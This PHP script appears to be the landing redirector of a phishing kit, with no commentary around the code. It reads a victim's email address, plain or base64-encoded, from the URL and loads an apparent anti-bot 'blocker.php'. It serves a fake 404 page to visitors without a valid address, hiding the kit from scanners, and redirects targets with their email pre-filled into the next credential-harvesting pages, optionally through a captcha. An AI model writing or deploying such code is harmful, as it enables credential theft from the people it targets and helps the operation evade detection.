<?php
error_reporting(0);
include('blocker.php');include('config.php');
$pagelink = 'proc?referrer=';
preg_match("/[^\/]+$/", urldecode( $_SERVER[ "REQUEST_URI" ] ), $matches);
$data = $matches[0];

   function begnWith($str, $begnString) {
      $len = strlen($begnString);
      return (substr($str, 0, $len) === $begnString);
   }
   if(begnWith($data,"?"))
 {
 $data = ltrim($data, '?');   
}

function endsWith($string, $endString) 
{ 
    $len = strlen($endString); 
    if ($len == 0) { 
        return true; 
    } 
    return (substr($string, -$len) === $endString); 
} 
if(endsWith($pagelink,"/")) 
 {
 $pagelink = rtrim($pagelink, '/');   
}
if ( base64_encode(base64_decode($data)) === $data){
$email = filter_var(base64_decode($data), FILTER_SANITIZE_EMAIL);
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    if(2==1 || 2=='1'){
	     exit(header('HTTP/1.0 404 Not Found'));   
    }else{
	     exit(header('HTTP/1.0 404 Not Found'));    
    }
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");  
} else {
    $email = $data;
}
} else if(filter_var($data, FILTER_VALIDATE_EMAIL)) {
    $email = base64_encode($data);

} else {
    if(2==1 || 2=='1'){
	     exit(header('HTTP/1.0 404 Not Found'));      
    }else{
	     exit(header('HTTP/1.0 404 Not Found'));      
    }
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");  
}
    if($use_captchaa !== "yes"){
		$bzz = $email;
		$bz2 = base64_decode($bzz);
header("Location: proc?email=$bz2");
    }else{
		$b2 = $email;
		$b3 = base64_decode($b2);
header("Location: proceed?data=$b3");       
    }
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");  
?>